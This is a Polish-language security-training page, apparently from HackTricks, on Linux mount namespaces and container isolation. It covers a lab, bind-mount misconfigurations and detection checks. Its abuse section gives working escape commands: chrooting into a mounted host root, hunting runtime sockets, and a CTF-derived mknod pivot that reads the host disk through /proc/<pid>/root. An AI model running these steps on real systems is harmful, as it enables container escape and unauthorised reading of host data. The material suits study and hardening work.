# Przestrzeń nazw montowania

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw montowania kontroluje **tabelę montowań**, którą widzi proces. To jedna z najważniejszych cech izolacji kontenera, ponieważ system plików root, bind mounts, tmpfs mounts, widok procfs, ekspozycja sysfs oraz wiele pomocniczych punktów montowania specyficznych dla runtime są wyrażone poprzez tę tabelę montowań. Dwa procesy mogą oba uzyskiwać dostęp do `/`, `/proc`, `/sys` lub `/tmp`, ale to, do czego te ścieżki się odnoszą, zależy od przestrzeni nazw montowania, w której się znajdują.

Z perspektywy bezpieczeństwa kontenerów, przestrzeń nazw montowania często decyduje między „to jest starannie przygotowany system plików aplikacji” a „ten proces może bezpośrednio zobaczyć lub wpływać na system plików hosta”. Dlatego bind mounts, `hostPath` volumes, uprzywilejowane operacje montowania oraz udostępnienia zapisywalnego `/proc` lub `/sys` koncentrują się wokół tej przestrzeni nazw.

## Działanie

Gdy runtime uruchamia kontener, zwykle tworzy świeżą przestrzeń nazw montowania, przygotowuje root filesystem dla kontenera, montuje procfs i inne pomocnicze systemy plików w razie potrzeby, a następnie opcjonalnie dodaje bind mounts, tmpfs mounts, secrets, config maps lub host paths. Gdy ten proces działa wewnątrz przestrzeni nazw, zestaw montowań, które widzi, jest w dużym stopniu odseparowany od domyślnego widoku hosta. Host może nadal widzieć rzeczywisty, leżący poniżej system plików, ale kontener widzi wersję złożoną dla niego przez runtime.

To jest potężne, ponieważ pozwala kontenerowi wierzyć, że ma własny root filesystem, mimo że host wciąż wszystko zarządza. Jest to również niebezpieczne, ponieważ jeśli runtime ujawni niewłaściwe montowanie, proces nagle zyskuje widoczność zasobów hosta, które reszta modelu bezpieczeństwa mogła nie być zaprojektowana, by chronić.

## Laboratorium

Możesz utworzyć prywatną przestrzeń nazw montowania za pomocą:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Jeśli otworzysz inną powłokę poza tą przestrzenią nazw i sprawdzisz tabelę montowań, zobaczysz, że punkt montowania tmpfs istnieje tylko wewnątrz izolowanej przestrzeni nazw montowania. To przydatne ćwiczenie, ponieważ pokazuje, że izolacja montowań to nie abstrakcyjna teoria — jądro dosłownie przedstawia procesowi inną tabelę montowań.

Jeśli otworzysz inną powłokę poza tą przestrzenią nazw i sprawdzisz tabelę montowań, punkt montowania tmpfs będzie istnieć tylko wewnątrz izolowanej przestrzeni nazw montowania.

W kontenerach szybkie porównanie wygląda tak:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Drugi przykład pokazuje, jak łatwo konfiguracja środowiska uruchomieniowego może zrobić poważną dziurę w granicy systemu plików.

## Użycie w środowisku uruchomieniowym

Docker, Podman, containerd-based stacks, and CRI-O wszystkie polegają na prywatnej przestrzeni nazw montowania dla zwykłych kontenerów. Kubernetes opiera się na tym samym mechanizmie dla wolumenów, projected secrets, config maps oraz montowań `hostPath`. Środowiska Incus/LXC także mocno polegają na przestrzeniach nazw montowania, zwłaszcza dlatego, że systemowe kontenery często udostępniają bogatsze i bardziej przypominające maszyny systemy plików niż kontenery aplikacyjne.

To oznacza, że kiedy przeglądasz problem z systemem plików kontenera, zwykle nie patrzysz na odizolowane dziwactwo Dockera. Patrzysz na problem przestrzeni nazw montowania i konfiguracji środowiska uruchomieniowego wyrażony przez platformę, która uruchomiła obciążenie.

## Błędne konfiguracje

Najbardziej oczywistym i niebezpiecznym błędem jest wystawienie root filesystem hosta lub innej wrażliwej ścieżki hosta przez bind mount, na przykład `-v /:/host` lub zapisywalny `hostPath` w Kubernetes. W tym momencie pytanie przestaje być „czy kontener jakoś ucieknie?” a staje się „ile użytecznej zawartości hosta jest już bezpośrednio widoczne i zapisywalne?” Zapisywalny host bind mount często sprowadza resztę exploita do prostego umieszczenia plików, chrootingu, modyfikacji konfiguracji lub odkrywania socketów runtime.

Innym częstym problemem jest wystawianie hostowego `/proc` lub `/sys` w sposób omijający bezpieczniejszy widok kontenera. Te systemy plików nie są zwykłymi montowaniami danych; są interfejsami do stanu jądra i procesów. Jeśli obciążenie uzyskuje dostęp bezpośrednio do wersji hosta, wiele założeń stojących za hardeningiem kontenerów przestaje być stosowanych wprost.

Ochrony tylko do odczytu też mają znaczenie. Root filesystem tylko do odczytu nie zabezpiecza kontenera magicznie, ale usuwa dużą część przestrzeni do przygotowań dla atakującego i utrudnia perzystencję, umieszczanie pomocniczych binarek oraz manipulacje konfiguracją. Odwrotnie, zapisywalny root lub zapisywalny host bind mount daje atakującemu miejsce na przygotowanie następnego kroku.

## Nadużycie

Gdy przestrzeń nazw montowania jest nadużywana, atakujący zwykle robią jedną z czterech rzeczy. Oni **odczytują dane hosta**, które powinny pozostać poza kontenerem. Oni **modyfikują konfigurację hosta** przez zapisywalne bind mounty. Oni **montują lub ponownie montują dodatkowe zasoby**, jeśli capabilities i seccomp na to pozwalają. Albo oni **dostępają do potężnych socketów i katalogów stanu runtime**, które pozwalają im poprosić samą platformę kontenerową o większy dostęp.

Jeżeli kontener już może zobaczyć system plików hosta, reszta modelu bezpieczeństwa zmienia się natychmiast.

Gdy podejrzewasz host bind mount, najpierw potwierdź, co jest dostępne i czy jest zapisywalne:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Jeśli system plików root hosta jest zamontowany jako read-write, bezpośredni dostęp do hosta często jest tak prosty jak:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Jeśli celem jest uprzywilejowany dostęp w runtime zamiast bezpośredniego chroot, enumeruj sockets i runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Jeśli `CAP_SYS_ADMIN` jest obecny, przetestuj także, czy można utworzyć nowe mounts z wnętrza kontenera:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Pełny przykład: Two-Shell `mknod` Pivot

Specjalistyczny wektor nadużycia pojawia się, gdy użytkownik root w containerze może tworzyć urządzenia blokowe, host i container współdzielą tożsamość użytkownika w użyteczny sposób, a atakujący już ma na hoście dostęp o niskich uprawnieniach. W takiej sytuacji container może utworzyć węzeł urządzenia, taki jak `/dev/sda`, a użytkownik hosta o niskich uprawnieniach będzie mógł później odczytać go przez `/proc/<pid>/root/` odpowiadającego procesu w containerze.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Na hoście, jako odpowiadający użytkownik o niskich uprawnieniach, po zlokalizowaniu PID powłoki kontenera:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Ważna lekcja nie polega na dokładnym wyszukiwaniu ciągów znaków w CTF. Chodzi o to, że ujawnienie mount-namespace przez `/proc/<pid>/root/` może pozwolić użytkownikowi hosta ponownie użyć węzłów urządzeń utworzonych przez kontener, nawet gdy polityka urządzeń cgroup uniemożliwiała ich bezpośrednie użycie wewnątrz samego kontenera.

## Sprawdzenia

Te polecenia mają pokazać widok systemu plików, w którym faktycznie działa bieżący proces. Celem jest wykrycie mountów pochodzących z hosta, zapisywalnych wrażliwych ścieżek oraz wszystkiego, co wygląda na szersze niż typowy root filesystem aplikacyjnego kontenera.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Co jest tu istotne:

- Bind mounts z hosta, zwłaszcza `/`, `/proc`, `/sys`, katalogi runtime state lub lokalizacje socketów, powinny od razu rzucać się w oczy.
- Nieoczekiwane read-write mounts są zwykle ważniejsze niż duże ilości read-only helper mounts.
- `mountinfo` jest często najlepszym miejscem, by sprawdzić, czy ścieżka rzeczywiście jest host-derived czy overlay-backed.

Te kontrole ustalają **które zasoby są widoczne w tym namespace**, **które z nich są host-derived**, oraz **które z nich są zapisywalne lub wrażliwe z punktu widzenia bezpieczeństwa**.
